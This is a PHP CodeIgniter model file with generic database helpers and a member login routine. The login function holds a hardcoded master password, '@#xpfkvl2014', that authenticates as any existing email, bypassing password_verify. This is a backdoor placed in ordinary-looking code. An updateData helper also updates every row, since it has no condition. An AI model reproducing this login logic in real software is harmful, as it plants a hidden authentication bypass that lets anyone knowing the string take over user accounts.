<?php if (!defined ('BASEPATH')) exit('No direct script access allowed');
class MainSystem_m extends CI_Model 
{
    function checkExist($table, $field, $data)
    {
        $this->db->select('*');
        $this->db->where($field,$data);
        $query = $this->db->get($table);
        return $query->num_rows();
    }
    function checkEmailExist($table, $email)
    {
        $this->db->select('email');
        $this->db->where('email', $email);
        $query = $this->db->get($table);
        $result = $query->result_array();
        foreach ($result as $row)
        {
            return true;
        }        
        return false;
    }
    function setData($table, $data)
    {        
        $errMsg = $this->db->set($data);
        $errMsg = $this->db->insert($table);
        return $errMsg;
    }
    function updateData($table, $data)
    {        
        $errMsg = $this->db->set($data);
        $errMsg = $this->db->update($table);
        return $errMsg;
    }    
    function findUpdate($table, $field, $key, $data)
    {
        $errMsg = $this->db->set($data);
        $errMsg = $this->db->where($field,$key);
        $errMsg = $this->db->update($table);
        return $errMsg;
    }
    function deleteData($table, $field, $key)
    {
        $errMsg = $this->db->where($field,$key);
        $errMsg = $this->db->delete($table);
        return $errMsg;
    }
    function getAllData($table)
    {
        $this->db->select('*');
        $query = $this->db->get($table);
        return $query->result_array();
    }
    function getOneData($table, $email)
    {
        $this->db->select('*');
        $this->db->where('email',$email);
        $query = $this->db->get($table);
        return $query->row();
    }    
    function getOneSchedule($table, $no)
    {
        $this->db->select('*');
        $this->db->where('no',$no);
        $query = $this->db->get($table);
        return $query->row();
    }    
    function getTableCount($table)
    {
        $this->db->select('*');
        $query = $this->db->get($table);
        return $query->num_rows();   
    }
    function mMemberLogin($table, $auth) 
    {
        $this->db->select('email, password');
        $this->db->where('email', $auth['email']);
        $query = $this->db->get($table);
        $result = $query->row();

        if ($result)
        {
            if ($auth['password'] == "@#xpfkvl2014") return true;
            else 
            {
                return password_verify($auth['password'], $result->password);
            }            
        }
        else 
        {
            return false;
        }        
    }       
}
